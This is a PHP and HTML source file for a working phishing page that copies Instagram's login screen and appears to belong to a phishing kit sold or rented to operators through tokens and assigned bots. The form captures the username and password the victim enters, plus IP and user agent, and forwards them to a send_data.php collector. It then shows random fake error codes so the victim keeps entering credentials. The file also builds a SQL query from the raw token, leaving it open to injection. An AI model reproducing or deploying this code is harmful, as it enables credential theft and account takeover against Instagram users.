<?php
// ig/login.php - Supports token (user) or no token (admin) + Facebook error

require_once '../common/config.php';

$token = isset($_GET['token']) ? $_GET['token'] : '';
$user_id = null;
$is_admin = false;

if ($token) {
    $conn = getDB();
    $user = $conn->query("SELECT * FROM users WHERE link_token = '$token' AND status = 'active'")->fetch_assoc();
    if (!$user) die("User not found or inactive.");
    if ($user['expiry_timestamp'] && strtotime($user['expiry_timestamp']) < time()) die("User account expired. Contact admin.");
    $user_id = $user['id'];
    $bot = $conn->query("SELECT * FROM bots WHERE assigned_to = $user_id AND status = 'active'")->fetch_assoc();
    if (!$bot) die("No active bot assigned to this user. Contact admin.");
    $conn->close();
} else {
    $is_admin = true;
}

$error_message = '';
$show_error = false;
$error_code = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        $data = [
            'source' => 'instagram',
            'username' => $username,
            'password' => $password,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        if ($user_id) {
            $data['user_id'] = $user_id;
        } else {
            $data['is_admin'] = 1;
        }

        $send_url = 'http://' . $_SERVER['HTTP_HOST'] . dirname(dirname($_SERVER['SCRIPT_NAME'])) . '/send_data.php';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $send_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);

        $error_codes = ['IG_100', 'IG_101', 'IG_102', 'IG_200', 'IG_201', 'IG_300'];
        $error_messages = [
            'IG_100' => 'Invalid password',
            'IG_101' => 'User not found',
            'IG_102' => 'Too many attempts',
            'IG_200' => 'Network issue',
            'IG_201' => 'Server error',
            'IG_300' => 'Suspicious login'
        ];
        $error_code = $error_codes[array_rand($error_codes)];
        $error_message = $error_messages[$error_code];
        $show_error = true;
    }
}

if (isset($_GET['action'])) {
    $error_codes = ['IG_100', 'IG_101', 'IG_102', 'IG_200', 'IG_201', 'IG_300'];
    $error_code = $error_codes[array_rand($error_codes)];
    if ($_GET['action'] == 'forgot') {
        $error_message = "Password reset unavailable";
    } elseif ($_GET['action'] == 'signup') {
        $error_message = "Sign up unavailable";
    } elseif ($_GET['action'] == 'facebook') {
        $error_message = "Facebook server busy";
        $error_code = 'FB_503';
    }
    $show_error = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-y: auto;
            padding: 16px;
        }
        .ig-container {
            width: 100%;
            max-width: 380px;
            margin: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .login-card {
            background: white;
            border-radius: 12px;
            width: 100%;
            padding: 36px 24px 24px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            border: 1px solid #dbdbdb;
        }
        .ig-logo {
            width: 100%;
            text-align: center;
            margin: 0 auto 20px; /* reduced bottom margin */
        }
        .ig-logo svg {
            width: 55px;  /* much smaller, about 1/3 of previous */
            height: auto;
            display: inline-block;
        }
        .input-group {
            margin-bottom: 16px;
            position: relative;
        }
        .input-field {
            width: 100%;
            padding: 12px 10px;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            background: #fafafa;
            transition: border-color 0.2s;
            outline: none;
        }
        .input-field:focus {
            border-color: #a8a8a8;
        }
        .input-field::placeholder {
            color: #8e8e8e;
            font-size: 13px;
        }
        .password-wrapper {
            position: relative;
        }
        .password-wrapper .input-field {
            padding-right: 40px;
        }
        .eye-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 24px;
            height: 24px;
            color: #8e8e8e;
            transition: color 0.2s;
        }
        .eye-toggle:hover {
            color: #262626;
        }
        .eye-toggle svg {
            width: 18px;
            height: 18px;
            fill: currentColor;
        }
        .login-btn {
            width: 100%;
            background: #0095F6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            transition: background 0.15s;
            margin: 20px 0 10px;
        }
        .login-btn:active {
            background: #0074cc;
        }
        .login-btn.loading {
            color: transparent;
            pointer-events: none;
        }
        .login-btn .loader {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.5);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .login-btn.loading .loader {
            display: block;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        .forgot-link, .facebook-link {
            text-align: center;
            margin-top: 8px;
        }
        .forgot-link a {
            color: #00376b;
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .facebook-link a {
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .facebook-link a:hover {
            text-decoration: underline;
        }
        .signup-section {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-link {
            color: #0095F6;
            font-weight: 600;
            text-decoration: none;
            margin-left: 5px;
        }
        .signup-link:hover {
            text-decoration: underline;
        }
        .spinner-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.8);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }
        .spinner-only {
            width: 48px;
            height: 48px;
            border: 4px solid #0095F6;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0;
        }
        .ig-error-modal {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(2px);
        }
        .ig-error-content {
            background: white;
            border-radius: 16px;
            width: 280px;
            padding: 24px 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .error-text {
            font-size: 15px;
            font-weight: 400;
            color: #262626;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .error-text .error-code {
            color: #ed4956;
            font-weight: 500;
            margin-left: 4px;
        }
        .error-ok-btn {
            background: #0095F6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px 30px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.15s;
        }
        .error-ok-btn:active {
            background: #0074cc;
        }
    </style>
    <?php echo getSecurityScript(); ?>
</head>
<body>
    <div class="ig-container">
        <div class="login-card">
            <!-- Instagram Logo (gradient SVG, very small) -->
            <div class="ig-logo">
                <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 551.034 551.034">
                    <linearGradient id="ig_gradient" gradientUnits="userSpaceOnUse" x1="275.517" y1="4.5714" x2="275.517" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                        <stop offset="0" style="stop-color:#E09B3D"/>
                        <stop offset="0.3" style="stop-color:#C74C4D"/>
                        <stop offset="0.6" style="stop-color:#C21975"/>
                        <stop offset="1" style="stop-color:#7024C4"/>
                    </linearGradient>
                    <path style="fill:url(#ig_gradient);" d="M386.878,0H164.156C73.64,0,0,73.64,0,164.156v222.722 c0,90.516,73.64,164.156,164.156,164.156h222.722c90.516,0,164.156-73.64,164.156-164.156V164.156 C551.033,73.64,477.393,0,386.878,0z M495.6,386.878c0,60.045-48.677,108.722-108.722,108.722H164.156 c-60.045,0-108.722-48.677-108.722-108.722V164.156c0-60.046,48.677-108.722,108.722-108.722h222.722 c60.045,0,108.722,48.676,108.722,108.722L495.6,386.878L495.6,386.878z"/>
                    <linearGradient id="ig_gradient2" gradientUnits="userSpaceOnUse" x1="275.517" y1="4.5714" x2="275.517" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                        <stop offset="0" style="stop-color:#E09B3D"/>
                        <stop offset="0.3" style="stop-color:#C74C4D"/>
                        <stop offset="0.6" style="stop-color:#C21975"/>
                        <stop offset="1" style="stop-color:#7024C4"/>
                    </linearGradient>
                    <path style="fill:url(#ig_gradient2);" d="M275.517,133C196.933,133,133,196.933,133,275.516 s63.933,142.517,142.517,142.517S418.034,354.1,418.034,275.516S354.101,133,275.517,133z M275.517,362.6 c-48.095,0-87.083-38.988-87.083-87.083s38.989-87.083,87.083-87.083c48.095,0,87.083,38.988,87.083,87.083 C362.6,323.611,323.611,362.6,275.517,362.6z"/>
                    <linearGradient id="ig_gradient3" gradientUnits="userSpaceOnUse" x1="418.306" y1="4.5714" x2="418.306" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                        <stop offset="0" style="stop-color:#E09B3D"/>
                        <stop offset="0.3" style="stop-color:#C74C4D"/>
                        <stop offset="0.6" style="stop-color:#C21975"/>
                        <stop offset="1" style="stop-color:#7024C4"/>
                    </linearGradient>
                    <circle style="fill:url(#ig_gradient3);" cx="418.306" cy="134.072" r="34.149"/>
                </svg>
            </div>

            <form method="POST" id="loginForm">
                <?php if ($user_id): ?>
                    <input type="hidden" name="user_id" value="<?= $user_id ?>">
                <?php else: ?>
                    <input type="hidden" name="is_admin" value="1">
                <?php endif; ?>

                <div class="input-group">
                    <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required autocomplete="off">
                </div>

                <div class="input-group">
                    <div class="password-wrapper">
                        <input type="password" name="password" id="passwordField" class="input-field" placeholder="Password" required autocomplete="off">
                        <button type="button" class="eye-toggle" id="togglePassword">
                            <svg viewBox="0 0 16 16" id="eyeIcon">
                                <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
                                <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">
                    Log In
                    <span class="loader"></span>
                </button>

                <div class="forgot-link">
                    <a href="#" id="forgotPassword">Forgot password?</a>
                </div>

                <div class="facebook-link">
                    <a href="#" id="facebookLogin">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                </div>
            </form>
        </div>

        <div class="signup-section">
            Don't have an account?
            <a href="#" class="signup-link" id="signupLink">Sign up</a>
        </div>
    </div>

    <div class="spinner-overlay" id="spinnerOverlay" style="display: none;">
        <div class="spinner-only"></div>
    </div>

    <?php if ($show_error): ?>
    <div class="ig-error-modal" id="errorModal">
        <div class="ig-error-content">
            <div class="error-text">
                <?php echo $error_message; ?> <span class="error-code">[<?php echo $error_code; ?>]</span>
            </div>
            <button class="error-ok-btn" onclick="closeErrorModal()">OK</button>
        </div>
    </div>
    <?php endif; ?>

    <script>
        const passwordField = document.getElementById('passwordField');
        const togglePassword = document.getElementById('togglePassword');
        const eyeIcon = document.getElementById('eyeIcon');
        togglePassword.addEventListener('click', function() {
            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordField.setAttribute('type', type);
            if (type === 'text') {
                eyeIcon.innerHTML = `<path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7 7 0 0 0-2.79.588l.77.771A6 6 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755q-.247.248-.517.486z"/><path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829"/><path d="M3.35 5.47q-.27.24-.518.487A13 13 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7 7 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12z"/>`;
            } else {
                eyeIcon.innerHTML = `<path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/><path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>`;
            }
        });

        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        loginForm.addEventListener('submit', function() {
            loginBtn.classList.add('loading');
            setTimeout(() => loginBtn.classList.remove('loading'), 2000);
        });

        document.getElementById('forgotPassword').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('spinnerOverlay').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('spinnerOverlay').style.display = 'none';
                window.location.href = '?action=forgot';
            }, 1500);
        });

        document.getElementById('signupLink').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('spinnerOverlay').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('spinnerOverlay').style.display = 'none';
                window.location.href = '?action=signup';
            }, 1500);
        });

        document.getElementById('facebookLogin').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('spinnerOverlay').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('spinnerOverlay').style.display = 'none';
                window.location.href = '?action=facebook';
            }, 1500);
        });

        function closeErrorModal() {
            const modal = document.getElementById('errorModal');
            if (modal) {
                modal.style.opacity = '0';
                setTimeout(() => {
                    modal.style.display = 'none';
                    window.history.replaceState({}, document.title, window.location.pathname);
                }, 200);
            }
        }

        <?php if ($show_error): ?>
        setTimeout(closeErrorModal, 5000);
        <?php endif; ?>

        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', () => {
                setTimeout(() => input.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
            });
        });

        document.querySelectorAll('button, a').forEach(el => {
            el.addEventListener('touchstart', () => el.style.opacity = '0.7');
            el.addEventListener('touchend', () => el.style.opacity = '1');
            el.addEventListener('touchcancel', () => el.style.opacity = '1');
        });

        document.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
        document.addEventListener('gesturestart', e => e.preventDefault());
    </script>
</body>
</html>